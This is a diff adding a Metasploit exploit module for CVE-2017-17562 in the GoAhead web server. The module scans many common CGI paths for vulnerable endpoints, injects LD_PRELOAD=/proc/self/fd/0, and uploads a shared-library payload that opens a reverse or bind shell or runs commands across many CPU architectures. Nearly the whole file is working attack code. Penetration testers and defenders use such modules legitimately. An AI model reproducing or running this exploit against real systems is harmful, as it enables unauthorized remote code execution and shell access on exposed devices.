@@ -1,0 +1,391 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'GoAhead Web Server LD_PRELOAD Arbitrary Module Load',
+      'Description'    => %q{
+          This module triggers an arbitrary shared library load vulnerability
+        in GoAhead web server versions between 2.5 and that have the CGI module
+        enabled.
+      },
+      'Author'         =>
+        [
+          'Daniel Hodson <daniel[at]elttam.com.au>', # Elttam Vulnerability Discovery & Python Exploit
+          'h00die',                                  # Metasploit Module
+          'hdm',                                     # Metasploit Module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2017-17562' ],
+          [ 'URL', 'https://www.elttam.com.au/blog/goahead/' ]
+        ],
+      'Payload'         =>
+        {
+          'Space'       => 5000,
+          'DisableNops' => true
+        },
+      'Platform'        => 'linux',
+      'Targets'         =>
+        [
+
+          [ 'Automatic (Reverse Shell)',
+            { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ], 'ReverseStub' => true,
+              'Payload' => {
+                'Compat' => {
+                  'PayloadType' => 'cmd_reverse_stub',
+                  'ConnectionType' => 'reverse',
+                }
+              }
+            }
+          ],
+
+          [ 'Automatic (Bind Shell)',
+            { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ], 'BindStub' => true,
+              'Payload' => {
+                'Compat' => {
+                  'PayloadType' => 'cmd_bind_stub',
+                  'ConnectionType' => 'bind'
+                }
+              }
+            }
+          ],
+
+          [ 'Automatic (Command)',
+            { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] }
+          ],
+          [ 'Linux x86',        { 'Arch' => ARCH_X86 } ],
+          [ 'Linux x86_64',     { 'Arch' => ARCH_X64 } ],
+          [ 'Linux ARM (LE)',   { 'Arch' => ARCH_ARMLE } ],
+          [ 'Linux ARM64',      { 'Arch' => ARCH_AARCH64 } ],
+          [ 'Linux MIPS',       { 'Arch' => ARCH_MIPS } ],
+          [ 'Linux MIPSLE',     { 'Arch' => ARCH_MIPSLE } ],
+          [ 'Linux MIPS64',     { 'Arch' => ARCH_MIPS64 } ],
+          [ 'Linux MIPS64LE',   { 'Arch' => ARCH_MIPS64LE } ],
+
+          # PowerPC stubs are currently over the 16384 maximum POST size
+          # [ 'Linux PPC',        { 'Arch' => ARCH_PPC } ],
+          # [ 'Linux PPC64',      { 'Arch' => ARCH_PPC64 } ],
+          # [ 'Linux PPC64 (LE)', { 'Arch' => ARCH_PPC64LE } ],
+
+          [ 'Linux SPARC',      { 'Arch' => ARCH_SPARC } ],
+          [ 'Linux SPARC64',    { 'Arch' => ARCH_SPARC64 } ],
+          [ 'Linux s390x',      { 'Arch' => ARCH_ZARCH } ],
+        ],
+      'DefaultOptions' =>
+        {
+          'SHELL'      => '/bin/sh',
+        },
+      'Privileged'      => false,
+      'DisclosureDate'  => 'Dec 18 2017', # June 9th, technically, via github commit.
+      'DefaultTarget'   => 0))
+
+    register_options(
+      [
+        OptString.new('TARGET_URI', [false, 'The path to a CGI script on the GoAhead server'])
+      ])
+  end
+
+  # Setup our mapping of Metasploit architectures to gcc architectures
+  def setup
+    super
+    @@payload_arch_mappings = {
+        ARCH_X86      => [ 'x86' ],
+        ARCH_X64      => [ 'x86_64' ],
+        ARCH_MIPS     => [ 'mips' ],
+        ARCH_MIPSLE   => [ 'mipsel' ],
+        ARCH_MIPSBE   => [ 'mips' ],
+        ARCH_MIPS64   => [ 'mips64' ],
+        ARCH_MIPS64LE => [ 'mips64el' ],
+
+        # PowerPC stubs are currently over the 16384 maximum POST size
+        # ARCH_PPC      => [ 'powerpc' ],
+        # ARCH_PPC64    => [ 'powerpc64' ],
+        # ARCH_PPC64LE  => [ 'powerpc64le' ],
+
+        ARCH_SPARC    => [ 'sparc' ],
+        ARCH_SPARC64  => [ 'sparc64' ],
+        ARCH_ARMLE    => [ 'armel', 'armhf' ],
+        ARCH_AARCH64  => [ 'aarch64' ],
+        ARCH_ZARCH    => [ 's390x' ],
+    }
+
+    # Architectures we don't offically support but can shell anyways with interact
+    @@payload_arch_bonus = %W{
+      mips64el sparc64 s390x
+    }
+
+    # General platforms (OS + C library)
+    @@payload_platforms = %W{
+      linux-glibc
+    }
+  end
+
+  # Use fancy payload wrappers to make exploitation a joyously lazy exercise
+  def cycle_possible_payloads
+    template_base = ::File.join(Msf::Config.data_directory, "exploits", "CVE-2017-17562")
+    template_list = []
+    template_type = nil
+    template_arch = nil
+
+    # Handle the generic command types first
+    if target.arch.include?(ARCH_CMD)
+
+      # Default to a system() template
+      template_type = 'system'
+
+      # Handle reverse_tcp() templates
+      if target['ReverseStub']
+        template_type = 'reverse'
+      end
+
+      # Handle reverse_tcp() templates
+      if target['BindStub']
+        template_type = 'bind'
+      end
+
+      all_architectures = @@payload_arch_mappings.values.flatten.uniq
+
+      # Prioritize the most common architectures first
+      %W{ x86_64 x86 armel armhf mips mipsel }.each do |t_arch|
+        template_list << all_architectures.delete(t_arch)
+      end
+
+      # Queue up the rest for later
+      all_architectures.each do |t_arch|
+        template_list << t_arch
+      end
+
+    # Handle the specific architecture targets next
+    else
+      template_type = 'shellcode'
+      target.arch.each do |t_name|
+        @@payload_arch_mappings[t_name].each do |t_arch|
+          template_list << t_arch
+        end
+      end
+    end
+
+    # Remove any duplicates that may have snuck in
+    template_list.uniq!
+
+    # Cycle through each top-level platform we know about
+    @@payload_platforms.each do |t_plat|
+
+      # Cycle through each template and yield
+      template_list.each do |t_arch|
+
+
+        wrapper_path = ::File.join(template_base, "goahead-cgi-#{template_type}-#{t_plat}-#{t_arch}.so.gz")
+        unless ::File.exist?(wrapper_path)
+          raise RuntimeError.new("Missing executable template at #{wrapper_path}")
+        end
+
+        data = ''
+        ::File.open(wrapper_path, "rb") do |fd|
+          data = Rex::Text.ungzip(fd.read)
+        end
+
+        pidx = data.index('PAYLOAD')
+        if pidx
+          data[pidx, payload.encoded.length] = payload.encoded
+        end
+
+        if %W{reverse bind}.include?(template_type)
+          pidx = data.index("55555")
+          if pidx
+            data[pidx, 5] = datastore['LPORT'].to_s.ljust(5)
+          end
+        end
+
+        if 'reverse' == template_type
+          pidx = data.index("000.000.000.000")
+          if pidx
+            data[pidx, 15] = datastore['LHOST'].to_s.ljust(15)
+          end
+        end
+
+        vprint_status("Using payload wrapper 'goahead-cgi-#{template_type}-#{t_arch}'...")
+        yield(data)
+
+        # Introduce a small delay for the payload to stage
+        Rex.sleep(0.50)
+
+        # Short-circuit once we have a session
+        return if session_created?
+      end
+    end
+  end
+
+  # Start the shell train
+  def exploit
+    # Find a valid CGI target
+    target_uri = find_target_cgi
+    return unless target_uri
+
+    # Create wrappers for each potential architecture
+    cycle_possible_payloads do |wrapped_payload|
+
+      # Trigger the vulnerability and run the payload
+      trigger_payload(target_uri, wrapped_payload)
+      return if session_created?
+    end
+  end
+
+  # Determine whether the target is exploitable
+  def check
+    # Find a valid CGI target
+    target_uri = find_target_cgi
+    unless target_uri
+      return Exploit::CheckCode::Unknown
+    end
+    return Exploit::CheckCode::Vulnerable
+  end
+
+  # Upload and LD_PRELOAD execute the shared library payload
+  def trigger_payload(target_uri, wrapped_payload)
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri),
+      'vars_get' => {
+        'LD_PRELOAD' => '/proc/self/fd/0'
+      },
+      'data' => wrapped_payload
+    })
+
+    nil
+  end
+
+  # Find an exploitable CGI endpoint. These paths were identified by mining Sonar HTTP datasets
+  def find_target_cgi
+
+    target_uris = []
+    common_dirs = %W^
+/
+/cgi-bin/
+/cgi/
+^
+    common_exts = ["", ".cgi"]
+    common_cgis = %W^
+admin
+apply
+non-CA-rev
+checkCookie
+check_user
+chn/liveView
+cht/liveView
+cnswebserver
+config
+configure/set_link_neg
+configure/swports_adjust
+eng/liveView
+firmware
+getCheckCode
+get_status
+getmac
+getparam
+guest/Login
+home
+htmlmgr
+index
+index/login
+jscript
+kvm
+liveView
+login
+login.asp
+login/login
+login/login-page
+login_mgr
+luci
+main
+main-cgi
+manage/login
+menu
+mlogin
+netbinary
+nobody/Captcha
+nobody/VerifyCode
+normal_userLogin
+otgw
+page
+rulectl
+service
+set_new_config
+sl_webviewer
+ssi
+status
+sysconf
+systemutil
+t/out
+top
+unauth
+upload
+variable
+wanstatu
+webcm
+webmain
+webproc
+webscr
+webviewLogin
+webviewLogin_m64
+webviewer
+welcome
+cgitest
+^
+
+    if datastore['TARGET_URI'].to_s.length > 0
+      target_uris << datastore['TARGET_URI']
+    end
+
+    common_dirs.each do |cgi_dir|
+      common_cgis.each do |cgi_path|
+        common_exts.each do |cgi_ext|
+          target_uris << "#{cgi_dir}#{cgi_path}#{cgi_ext}"
+        end
+      end
+    end
+
+    print_status("Searching #{target_uris.length} paths for an exploitable CGI endpoint...")
+
+    target_uris.each do |uri|
+      if is_cgi_exploitable?(uri)
+        print_good("Exploitable CGI located at #{uri}")
+        return uri
+      end
+    end
+
+    print_error("No valid CGI endpoints identified")
+    return
+  end
+
+  # Use the output of LD_DEBUG=help to determine whether an endpoint is exploitable
+  def is_cgi_exploitable?(uri)
+    res = send_request_cgi({'uri' => uri, 'method' => 'POST', 'vars_get' => { 'LD_DEBUG' => 'help' }})
+
+    if res
+      vprint_status("Request for #{uri} returned #{res.code}: #{res.message}")
+    else
+      vprint_status("Request for #{uri} did not return a response")
+    end
+
+    !!(res && res.body && res.body.to_s.include?("LD_DEBUG_OUTPUT"))
+  end
+
+  # This sometimes determines if the CGI module is enabled, but doesn't seem
+  # to return the error to the client in newer versions. Unused for now.
+  def is_cgi_enabled?
+    return true
+    res = send_request_cgi({'uri' => "/cgi-bin"})
+    !!(res && res.body && res.body.to_s.include?("Missing CGI name"))
+  end
+end
